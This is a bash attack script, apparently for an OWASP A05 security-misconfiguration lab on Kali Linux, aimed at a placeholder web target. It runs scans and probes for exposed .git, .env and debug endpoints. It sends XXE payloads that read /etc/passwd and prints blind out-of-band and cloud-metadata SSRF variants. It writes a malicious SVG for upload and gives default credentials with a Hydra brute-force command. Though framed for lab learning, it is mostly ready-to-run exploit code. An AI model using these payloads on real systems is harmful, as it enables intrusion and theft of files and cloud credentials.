#!/bin/bash
# ============================================================
# A05:2021 — Security Misconfiguration
# Kali Linux Attack & Analysis Script
# ============================================================
# Tools used: curl, nikto, nmap, python3
# Usage: bash a05_misconfiguration.sh
# ============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

TARGET="http://TARGET_IP_OR_DOMAIN"
TARGET_HOST=$(echo "$TARGET" | sed 's|https\?://||' | cut -d':' -f1 | cut -d'/' -f1)
TARGET_PORT=$(echo "$TARGET" | grep -oP ':\K[0-9]+' || echo "80")

echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║  A05:2021 — Security Misconfiguration Lab       ║"
echo "╚══════════════════════════════════════════════════╝${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 1: Nikto — Web Server Scanner
# ─────────────────────────────────────────────
echo -e "${BOLD}[1] Nikto — Web Server Vulnerability Scanner${NC}"
echo -e "${YELLOW}    Scanning for misconfigurations, default files, dangerous headers${NC}"
echo ""
echo -e "    ${CYAN}Command:${NC} nikto -h $TARGET -C all -Format txt"
echo ""
nikto -h "$TARGET" \
  -Plugins "headers;paths;auth;outdated;shellshock;dominos" \
  -maxtime 120s \
  -Format txt \
  2>/dev/null | grep -vE "^-" | head -60 || \
  echo -e "    ${YELLOW}[!] nikto failed. Try: nikto -h $TARGET -C all${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 2: Directory Listing Detection
# ─────────────────────────────────────────────
echo -e "${BOLD}[2] Directory Listing Detection${NC}"
echo -e "${YELLOW}    Checking common paths for exposed directory listings${NC}"
echo ""

DIR_LISTING_PATHS=(
  "/"
  "/uploads/"
  "/files/"
  "/backup/"
  "/images/"
  "/static/"
  "/assets/"
  "/logs/"
  "/data/"
  "/tmp/"
  "/config/"
  "/.git/"
  "/.svn/"
)

for path in "${DIR_LISTING_PATHS[@]}"; do
  RESPONSE=$(curl -s --max-time 8 "$TARGET$path" 2>/dev/null)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "$TARGET$path" 2>/dev/null)

  if echo "$RESPONSE" | grep -qiE "Index of|Parent Directory|Directory listing"; then
    echo -e "    ${RED}[DIR LISTING!]${NC} $path (HTTP $STATUS)"
  elif [ "$STATUS" == "200" ]; then
    echo -e "    [HTTP 200]      $path — page exists, check manually"
  elif [ "$STATUS" == "403" ]; then
    echo -e "    ${GREEN}[403 PROTECTED]${NC} $path"
  else
    echo -e "    [HTTP $STATUS]  $path"
  fi
done

echo ""
echo -e "    ${YELLOW}[TIP] A /.git/ directory exposed is critical — clone the full repo:${NC}"
echo -e "    ${BOLD}git-dumper $TARGET/.git/ ./dumped_repo${NC}"
echo -e "    ${BOLD}pip3 install git-dumper${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 3: XXE — XML External Entity Injection
# ─────────────────────────────────────────────
echo -e "${BOLD}[3] XXE — XML External Entity Injection${NC}"
echo -e "${YELLOW}    Testing XML endpoints for external entity processing${NC}"
echo ""

XML_ENDPOINT="$TARGET/api/upload"    # Adjust to any endpoint that accepts XML

echo -e "    ${CYAN}[3a] Basic XXE — reading /etc/passwd:${NC}"
XXE_PAYLOAD_1='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'

echo -e "    ${CYAN}Payload:${NC}"
echo "$XXE_PAYLOAD_1"
echo ""
echo -e "    ${CYAN}Sending to $XML_ENDPOINT ...${NC}"
RESPONSE_1=$(curl -s --max-time 10 \
  -X POST \
  -H "Content-Type: application/xml" \
  -d "$XXE_PAYLOAD_1" \
  "$XML_ENDPOINT" 2>/dev/null)

if echo "$RESPONSE_1" | grep -qE "root:|daemon:|bin:|nobody:"; then
  echo -e "    ${RED}[XXE VULNERABLE!]${NC} /etc/passwd content returned in response!"
  echo "$RESPONSE_1" | head -5
elif [ -n "$RESPONSE_1" ]; then
  echo -e "    Response (check for file content): $(echo "$RESPONSE_1" | head -3)"
else
  echo -e "    ${YELLOW}[!] No response. Target endpoint may not accept XML, or is unreachable.${NC}"
fi
echo ""

echo -e "    ${CYAN}[3b] Blind XXE — out-of-band via DNS (requires external listener):${NC}"
echo ""
echo -e "    ${YELLOW}# Set up a DNS listener with Burp Collaborator or interactsh:${NC}"
echo -e "    ${BOLD}interactsh-client${NC}"
echo -e "    # Then use this payload with YOUR_COLLABORATOR_URL replaced:"
cat << 'HEREDOC'
    Payload:
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
      <!ENTITY % xxe SYSTEM "http://YOUR_COLLABORATOR_URL/xxe">
      %xxe;
    ]>
    <root><data>test</data></root>
HEREDOC
echo ""

echo -e "    ${CYAN}[3c] XXE for SSRF — accessing internal services:${NC}"
XXE_SSRF='<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>'
echo ""
echo "$XXE_SSRF"
echo ""
echo -e "    ${YELLOW}[TIP] If the server is on AWS, this retrieves cloud metadata (IAM keys!).${NC}"
echo ""

echo -e "    ${CYAN}[3d] XXE via file upload (SVG/DOCX/XLSX contain XML):${NC}"
mkdir -p /tmp/a05_demo
cat > /tmp/a05_demo/xxe_payload.svg << 'SVGEOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
SVGEOF
echo -e "    Malicious SVG written to: /tmp/a05_demo/xxe_payload.svg"
echo -e "    Upload this file to any endpoint that processes SVG images."
echo ""

# ─────────────────────────────────────────────
# SECTION 4: Verbose Error Messages
# ─────────────────────────────────────────────
echo -e "${BOLD}[4] Verbose Error Message Detection${NC}"
echo -e "${YELLOW}    Triggering errors to check information disclosure${NC}"
echo ""

ERROR_TRIGGERS=(
  "/nonexistent_page_12345"
  "/index.php?id='"
  "/api/data?param=../../etc/passwd"
  "/search?q=<invalid>"
  "/.env"
  "/config.php.bak"
  "/phpinfo.php"
  "/server-status"
  "/actuator"
  "/actuator/env"
  "/actuator/health"
  "/.htaccess"
  "/web.config"
  "/crossdomain.xml"
  "/robots.txt"
  "/sitemap.xml"
)

SENSITIVE_PATTERNS="stack trace|exception|error in|warning:|at line|phpinfo|DB_PASSWORD|DB_HOST|SECRET_KEY|debug|traceback|syntax error"

echo -e "    ${CYAN}Probing for verbose errors and sensitive files on $TARGET${NC}"
echo ""
for path in "${ERROR_TRIGGERS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "$TARGET$path" 2>/dev/null)
  RESPONSE=$(curl -s --max-time 8 "$TARGET$path" 2>/dev/null)

  if echo "$RESPONSE" | grep -qiE "$SENSITIVE_PATTERNS"; then
    echo -e "    ${RED}[DISCLOSURE!]${NC} $path (HTTP $STATUS) — sensitive info in response!"
  elif [ "$STATUS" == "200" ]; then
    echo -e "    ${YELLOW}[HTTP 200]${NC}   $path — accessible, check content manually"
  elif [ "$STATUS" == "403" ]; then
    echo -e "    [403]        $path — exists but protected"
  else
    echo -e "    [HTTP $STATUS] $path"
  fi
done

echo ""

# ─────────────────────────────────────────────
# SECTION 5: Default Credentials Check
# ─────────────────────────────────────────────
echo -e "${BOLD}[5] Default Credentials Detection${NC}"
echo -e "${YELLOW}    Testing common admin panels for default username/password combinations${NC}"
echo ""

ADMIN_PATHS=("/admin" "/wp-admin" "/administrator" "/manager" "/phpmyadmin" "/adminer.php" "/jenkins" "/grafana" "/kibana")

echo -e "    ${CYAN}Common default credential pairs to test manually:${NC}"
echo ""
printf "    %-20s %-20s\n" "Username" "Password"
printf "    %-20s %-20s\n" "--------" "--------"
DEFAULT_CREDS=(
  "admin:admin"
  "admin:password"
  "admin:123456"
  "admin:(blank)"
  "root:root"
  "root:toor"
  "administrator:administrator"
  "guest:guest"
  "test:test"
)
for cred in "${DEFAULT_CREDS[@]}"; do
  user=$(echo "$cred" | cut -d':' -f1)
  pass=$(echo "$cred" | cut -d':' -f2)
  printf "    ${CYAN}%-20s %-20s${NC}\n" "$user" "$pass"
done

echo ""
echo -e "    ${YELLOW}[TIP] Use Hydra to automate default credential testing:${NC}"
echo -e "    ${BOLD}hydra -L /usr/share/wordlists/metasploit/http_default_users.txt \\${NC}"
echo -e "    ${BOLD}      -P /usr/share/wordlists/metasploit/http_default_pass.txt \\${NC}"
echo -e "    ${BOLD}      $TARGET_HOST http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"${NC}"
echo ""

echo -e "${CYAN}${BOLD}[A05 Complete]${NC} Document all misconfigured paths, errors, and exposed information."
echo ""
